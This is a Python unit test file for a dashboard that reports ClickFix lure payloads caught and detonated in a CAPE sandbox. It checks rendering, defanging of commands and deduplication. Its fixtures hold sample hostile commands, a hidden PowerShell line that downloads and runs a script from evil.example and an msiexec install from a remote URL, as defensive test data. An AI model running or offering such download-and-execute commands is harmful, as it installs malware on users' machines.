"""Offline tests for the ClickFix detonations dashboard (dashboard.py)."""
import json
import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import dashboard as d  # noqa: E402


class DashboardTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        from config import load_config
        self.cfg = load_config()
        self.recs = os.path.join(self.tmp, "detonations.jsonl")
        self.out = os.path.join(self.tmp, "dash.html")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write(self, rows):
        with open(self.recs, "w") as fh:
            for r in rows:
                fh.write(json.dumps(r) + "\n")

    def test_empty_renders_placeholder(self):
        res = d.build(self.recs, self.out, self.cfg)
        self.assertEqual(res["records"], 0)
        html = open(self.out).read()
        self.assertIn("No ClickFix payloads caught yet", html)

    def test_rows_render_and_command_is_defanged(self):
        self._write([
            {"swept_at": "2026-10-25T07:00:00Z", "domain": "evil.example", "source": "browser",
             "cape_package": "ps1", "detonation": "submitted", "route": "vpn",
             "cape_task_id": 4242, "sha256": "a" * 64,
             "text": "powershell -w hidden -c \"iwr https://evil.example/a.ps1 | iex\""},
            {"swept_at": "2026-10-25T07:05:00Z", "domain": "held.example", "source": "urlscan_dom",
             "cape_package": "batch", "detonation": "held_no_isolated_route:no_isolated_route_enabled",
             "sha256": "b" * 64, "text": "msiexec /i https://held.example/x"},
        ])
        res = d.build(self.recs, self.out, self.cfg)
        self.assertEqual(res["records"], 2)
        self.assertEqual(res["counts"]["detonated"], 1)
        self.assertEqual(res["counts"]["held"], 1)
        html = open(self.out).read()
        self.assertIn("evil.example", html)
        self.assertIn("/analysis/4242/", html)          # CAPE task link
        self.assertIn("hxxps://", html)                  # command defanged, not live
        self.assertNotIn("https://evil.example/a.ps1", html)

    def test_latest_record_per_key_wins(self):
        self._write([
            {"swept_at": "2026-10-25T07:00:00Z", "sha256": "k", "domain": "x", "detonation": "dry_run",
             "text": "powershell x"},
            {"swept_at": "2026-10-25T08:00:00Z", "sha256": "k", "domain": "x", "detonation": "submitted",
             "cape_task_id": 9, "text": "powershell x"},
        ])
        res = d.build(self.recs, self.out, self.cfg)
        self.assertEqual(res["records"], 1)
        self.assertEqual(res["counts"]["detonated"], 1)


if __name__ == "__main__":
    unittest.main()
